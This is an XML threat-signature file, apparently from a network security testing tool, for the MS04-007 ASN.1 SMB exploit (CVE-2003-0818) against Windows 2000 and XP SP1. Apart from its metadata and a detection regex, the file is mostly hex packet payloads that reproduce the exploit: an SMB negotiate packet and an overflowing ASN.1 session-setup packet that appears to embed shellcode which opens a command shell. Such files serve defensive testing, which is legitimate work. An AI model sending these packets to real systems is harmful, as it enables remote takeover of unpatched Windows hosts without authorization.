<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="MS04-007 ASN1 SMB Exploit"/>
    <EngDesc display="true" value="This threat attempts to gain entry to a Windows server through the ASN1 vulnerability described in CVE-2003-0818.  This threat was fixed by Microsoft's patch, however the vulnerability details have only been disclosed."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
      <item value="Implementation_Exploitation"/>
      <item value="Unauthorized_Access"/>
    </Intent>
    <Protocol display="true" value="SMB"/>
    <Type_Of_Equipment display="true">
      <item value="Host"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Windows"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Windows_2000"/>
      <item value="Microsoft_Windows_XP_SP1"/>
    </Known_Versions_Affected>
    <Credit display="true" value="http://www.phreedom.org/solar/exploits/msasn1-bitstring/"/>
    <CVEID display="true" value="CVE-2003-0818"/>
    <bugtraqID display="true" value="13300"/>
    <OSVDB display="true" value="3902"/>
    <Author display="true" value="Chuck McAuley"/>
    <ID display="true" value="00000103a614b4d300c000a80001003c6defc025"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <SoftwareRevision display="true" value="1.4"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="false"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="632742200148906250"/>
    <SigStyle display="false" value="Matching"/>
    <targetNode display="false" value="C"/>
    <SigProtocol display="false" value="TCP"/>
    <Rate display="false" value="1"/>
    <Regex display="false" value="\X00\X00\X10\XBF\XFF\X53\X4D\X42\X73\X00\X00\X00\X00\X18\X07\XC8\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\XFF\X3F\X00\X00\X00\X00\X0C\XFF\X00\X00\X00\X04\X11\X0A\X00\X00\X00\X00\X00\X00\X00\X7E\X10\X00\X00\X00\X00\XD4\X00\X00\X80\X7E\X10\X60\X82\X10\X7A\X06\X06\X2B\X06\X01\X05\X05\X02\XA0\X82\X10\X6E\X30\X82\X10\X6A\XA1\X82\X10\X66\X23\X82\X10\X62\X03\X82\X04\X01\X00\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41"/>
    <Created value="1139461789" display="false"/>
    <ServerSideAttack display="false" value="false"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="I"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
      <for index="H"/>
      <for index="I"/>
    </for>
    <for index="C">
      <for index="E"/>
      <for index="F"/>
      <for index="G"/>
      <for index="H"/>
      <for index="I"/>
    </for>
  </Loops>
  <Output index="A" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000085FF534D4272000000001853C80000000000000000000000000000FF3F00000000006200025043204E4554574F524B2050524F4752414D20312E3000024C414E4D414E312E30000257696E646F777320666F7220576F726B67726F75707320332E316100024C4D312E325830303200024C414E4D414E322E3100024E54204C4D20302E313200" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="C" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026, 65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000010BFFF534D4273000000001807C80000000000000000000000000000FF3F000000000CFF00000004110A000000000000007E1000000000D40000807E106082107A06062B0601050502A082106E3082106AA182106623821062038204010041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141030023820C570382040A009042904290429042E838000000434D4400E779C679E5498649A4AD2EE9A41A70C7D909F5ADCBEDFC3B8E4E0EECEFCEE060ADD905CE72FEB3165753325F33322E444C4C00015B5489E5895D006A3059648B018B400C8B701CAD8B5808EB0C8D572C5152FFD089C359EB106A085E01EE6A0A598B7D0080F90674E45153FF348FE8900000005989048EE2EB31FF6681EC9001546801010000FF55205757575747574757FF551C89C331FF5757680200221189E66A105653FF55185753FF5514575653FF551089C26681EC54008D3C2431C06A1559F3AB89D7C644241044FE44243D897C2448897C244C897C24508D44241054505151514151495151FF750051FF553089E168FFFFFFFFFF31FF552C57FF550CFF5528535556578B6C24188B453C8B54057801EA8B4A188B5A2001EBE332498B348B01EE31FFFC31C0AC38E07407C1CF0D01C7EBF23B7C241475E18B5A2401EB668B0C4B8B5A1C01EB8B048B01E8EB0231C089EA5F5E5D5BC20800424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242230A030800F80F0100F80F012382083903820411004343434320F0FD7F5356576681EC800089E6E8ED000000FF36680912D663E8F7000000894608E8A2000000FF7604686BD02BCAE8E200000089460CE83F000000FF760468FA97024CE8CD00000031DB681004000053FFD089C3568B761089C7B910040000F3A45E31C0505050535050FF560C8B46086681C480005F5E5BFFE060E8230000008B44240C8D587C83433C058143280010000081632800F0FFFF8B042483C4145031C0C331D264FF3264892231DBB89042904231C9B10289DFF3AF740343EBF3897E10648F025861C360BF20F0FD7F8B1F8B460889078B7FF881C77801000089F9391974048B09EBF889FA395A0474058B5204EBF68911894A04C643FD0161C3A10CF0FD7F8B401C8B5808891E8B008B4008894604C3608B6C24288B453C8B54057801EA8B4A188B5A2001EBE338498B348B01EE31FF31C0FCAC38E07407C1CF0D01C7EBF43B7C242475E18B5A2401EB668B0C4B8B5A1C01EB8B048B01E88944241C61C20800EBFE4343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434323820420030900EB0690909090909003820411004444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
</threatSignature>
